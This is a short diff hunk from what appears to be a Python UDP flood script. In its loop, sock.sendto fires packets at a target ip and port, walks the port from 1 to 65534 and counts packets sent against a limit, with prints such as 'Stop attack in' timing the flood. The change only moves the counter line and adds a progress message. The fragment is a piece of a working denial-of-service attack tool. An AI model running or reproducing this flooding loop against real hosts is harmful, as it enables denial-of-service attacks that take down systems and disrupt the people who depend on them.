@@ -69,10 +69,11 @@ while True:
             print(nowminute)
             print('Stop attack in %s:%s'%(hour,stopminute))
             sock.sendto(bytes, (ip,port))
-            sent = sent + 1            
-            stopattack = mil - sent 
-print('###',stopattack)
+            sent = sent + 1
             port = port + 1
+            stopattack = mil - sent 
+            print('pack %s remained %s'%(sent,stopattack))
+            
             if port == 65534:
                         port = 1
                         
